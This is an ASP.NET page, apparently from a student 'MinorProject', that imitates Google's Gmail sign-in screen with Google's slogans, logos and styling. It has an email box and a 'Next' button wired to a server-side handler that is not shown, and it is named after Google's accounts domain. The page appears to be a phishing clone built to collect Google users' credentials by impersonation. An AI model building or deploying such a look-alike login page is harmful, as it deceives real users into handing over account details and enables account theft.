<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="accounts.google.aspx.cs" Inherits="MinorProject.accounts_google" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Gmail Login</title>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
    <meta property="og:locale" content="en_US" />
    <style type="text/css">
        body {
            background: white;
            height: 700px;
            margin: 0px;
            padding: 0px;
        }

        .base {
            position: absolute;
            width: 100%;
            top: 0px;
            left: 0px;
            color: gray;
        }

        #logo {
            margin-top: 20px;
            height: 38px;
            width: 500px;
        }

        #info1 {
            width: 500px;
            margin-top: 25px;
            font-family: 'Open Sans', sans-serif;
            font-size: 38px;
            color: #555557;
        }

        #info2 {
            width: 500px;
            margin-top: 17px;
            font-family: 'Open Sans', sans-serif;
            font-size: 18px;
            font-weight: bold;
            color: #555557;
        }

        #form {
            margin-top: 17px;
            width: 355px;
            height: 280px;
            padding-top: 40px;
            background: #f7f7f7;
            box-shadow: 0px 1px 1px 1px #c6c1c1;
        }

        #form-img {
            width: 99px;
            height: 99px;
        }

        #mailbox {
            width: 270px;
            height: 42px;
            border-radius: 5px 5px 5px 5px;
            background: white;
            font-size: 18px;
            margin-top: 20px;
            border-width: 0px;
            border-style: solid;
            border-color: blue;
        }

        #button2 {
            width: 280px;
            height: 35px;
            margin-top: 10px;
            background: #498af2;
            font-family: verdana;
            margin-left: 10px;
            font-weight: bold;
            font-size: 14px;
            color: white;
            border-radius: 3px;
            border-width: 1px;
            border-style: solid;
            border-color: gray;
            cursor: pointer;
            outline: none;
        }

        #info3 {
            float: right;
            margin-top: 10px;
            font-size: 13px;
            font-family: 'Open Sans', sans-serif;
            color: #498af2;
            padding-right: 42px;
            font-weight: bold;
        }

            #info3 a {
                color: #498af2;
                text-decoration: none;
            }

        #info4 {
            margin-top: 25px;
            font-size: 13px;
            font-family: 'Open Sans', sans-serif;
            font-weight: bold;
        }

            #info4 a {
                color: #498af2;
                text-decoration: none;
            }

        #info5 {
            margin-top: 30px;
            font-size: 13px;
            font-family: 'Open Sans', sans-serif;
            color: #87898b;
            font-weight: bold;
        }

        #logo2 {
            margin-top: 10px;
            height: 27px;
            width: 243px;
        }

        #bottom {
            float: left;
            padding: 0px;
            margin: 0px;
        }

            #bottom ul {
                list-style: none;
            }

                #bottom ul li {
                    float: left;
                    margin-left: 20px;
                }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <script>
            (function (i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                    (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date(); a = s.createElement(o),
                    m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
            })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

            ga('create', 'UA-73364464-1', 'auto');
            ga('send', 'pageview');

        </script>
        <center>
        <div class="base">
            <div id="logo">
                <img src="img/logo.png" width="118" height="38" />
            </div>
            <div id="info1">
                One account. All of Google.
            </div>
            <div id="info2">
                Sign in to continue to Gmail
            </div>
            <div id="form">
                <div id="form-img">
                    <img src="img/profile-img.png" width="99" height="99" />
                </div>
                <div id="mailbox">
                    <asp:TextBox ID="txtEmail"  placeholder="Enter your email" autofocus runat="server" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" required></asp:TextBox>                    
                </div>
                <div>
                    <asp:Button ID="button2" runat="server" Text="Next" OnClick="button2_Click"></asp:Button>
                </div>
                <div id="info3">
                    <a href="#">Need help?</a>
                </div>
            </div>
            <div id="info4">
                <a href="#" >Create account</a>
            </div>
            <div id="info5">
                One Google Account for everything Google
            </div>
            <div>
                <img src="img/footer-logo.png" id="logo2" />
            </div>
            <div id="bottom">
                <ul></ul>
            </div>

        </div>
    </center>
    </form>
</body>
</html>
